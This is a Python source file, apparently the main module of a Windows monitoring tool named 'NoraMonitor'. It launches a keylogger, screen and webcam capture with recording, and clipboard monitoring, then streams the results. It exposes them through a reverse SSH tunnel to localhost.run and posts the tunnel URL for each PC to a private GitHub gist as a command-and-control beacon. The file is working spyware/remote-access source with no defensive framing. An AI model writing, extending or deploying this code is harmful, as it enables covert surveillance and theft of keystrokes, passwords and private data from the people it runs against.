import os
import re
import json
import datetime
import subprocess
import threading
import urllib.request

import server
import keylogger as kl
import screencap as sc
import controller
import recorder as rec
import camera as cam
import clipboard_monitor as cb

PORT = int(os.environ.get("NORA_PORT", 9090))

_APP_DIR        = os.path.join(os.path.expandvars("%APPDATA%"), "NoraMonitor")
_RECORDINGS_DIR = os.path.join(_APP_DIR, "recordings")
_CONFIG_FILE    = os.path.join(_APP_DIR, "config.json")


def _load_config():
    try:
        with open(_CONFIG_FILE) as f:
            return json.load(f)
    except Exception:
        return {}


def _save_config(cfg):
    try:
        with open(_CONFIG_FILE, "w") as f:
            json.dump(cfg, f, indent=2)
    except Exception:
        pass


def _ensure_gist(token):
    """Create gist on first run, return gist_id."""
    payload = json.dumps({
        "description": "Nora Monitor Agent URLs",
        "public": False,
        "files": {"nora_agents.json": {"content": "{}"}}
    }).encode()
    req = urllib.request.Request(
        "https://api.github.com/gists",
        data=payload, method="POST",
        headers={
            "Authorization": f"token {token}",
            "Content-Type": "application/json",
            "Accept": "application/vnd.github.v3+json",
            "User-Agent": "NoraMonitor"
        }
    )
    with urllib.request.urlopen(req, timeout=10) as r:
        return json.loads(r.read())["id"]


def _post_to_gist(tunnel_url, pc_name, token, gist_id):
    try:
        # Fetch existing content and merge
        req = urllib.request.Request(
            f"https://api.github.com/gists/{gist_id}",
            headers={
                "Authorization": f"token {token}",
                "Accept": "application/vnd.github.v3+json",
                "User-Agent": "NoraMonitor"
            }
        )
        with urllib.request.urlopen(req, timeout=10) as r:
            data = json.loads(r.read())
            existing = json.loads(data["files"]["nora_agents.json"]["content"])
    except Exception:
        existing = {}

    existing[pc_name] = {
        "url": tunnel_url,
        "updated": datetime.datetime.utcnow().strftime("%Y-%m-%dT%H:%M:%SZ")
    }

    payload = json.dumps({
        "files": {"nora_agents.json": {"content": json.dumps(existing, indent=2)}}
    }).encode()
    req = urllib.request.Request(
        f"https://api.github.com/gists/{gist_id}",
        data=payload, method="PATCH",
        headers={
            "Authorization": f"token {token}",
            "Content-Type": "application/json",
            "Accept": "application/vnd.github.v3+json",
            "User-Agent": "NoraMonitor"
        }
    )
    urllib.request.urlopen(req, timeout=10)


def _start_tunnel(port):
    def _run():
        try:
            cmd = [
                "ssh", "-o", "StrictHostKeyChecking=no",
                "-o", "ServerAliveInterval=30",
                "-R", f"80:localhost:{port}",
                "nokey@localhost.run"
            ]
            proc = subprocess.Popen(
                cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True
            )
            for line in proc.stdout:
                m = re.search(r'https?://\S+\.localhost\.run', line)
                if m:
                    tunnel_url = m.group(0)
                    import time; time.sleep(2)
                    server.broadcast_ngrok_url(tunnel_url)

                    # Push URL to gist if configured
                    cfg = _load_config()
                    token   = cfg.get("github_token", "")
                    gist_id = cfg.get("gist_id", "")
                    pc_name = cfg.get("pc_name", "PC")
                    if token:
                        try:
                            if not gist_id:
                                gist_id = _ensure_gist(token)
                                cfg["gist_id"] = gist_id
                                _save_config(cfg)
                            _post_to_gist(tunnel_url, pc_name, token, gist_id)
                        except Exception:
                            pass
                    break
            proc.wait()
        except Exception:
            pass
    threading.Thread(target=_run, daemon=True).start()


def main():
    os.makedirs(_APP_DIR, exist_ok=True)
    os.makedirs(_RECORDINGS_DIR, exist_ok=True)

    recorder = rec.Recorder(output_dir=_RECORDINGS_DIR, fps=10)
    camera   = cam.CameraCapture(on_frame=server.broadcast_camera, fps=10, quality=55)

    server.init(controller.handle_command, recorder, camera)

    kl.Keylogger(server.broadcast_key).start()

    capture = sc.ScreenCapture(server.broadcast_frame, fps=12, quality=55, scale=0.6)
    capture.attach_recorder(recorder)
    capture.start()

    cb.ClipboardMonitor(server.broadcast_clipboard).start()

    threading.Thread(target=_start_tunnel, args=(PORT,), daemon=True).start()

    server.run(port=PORT)


if __name__ == "__main__":
    main()
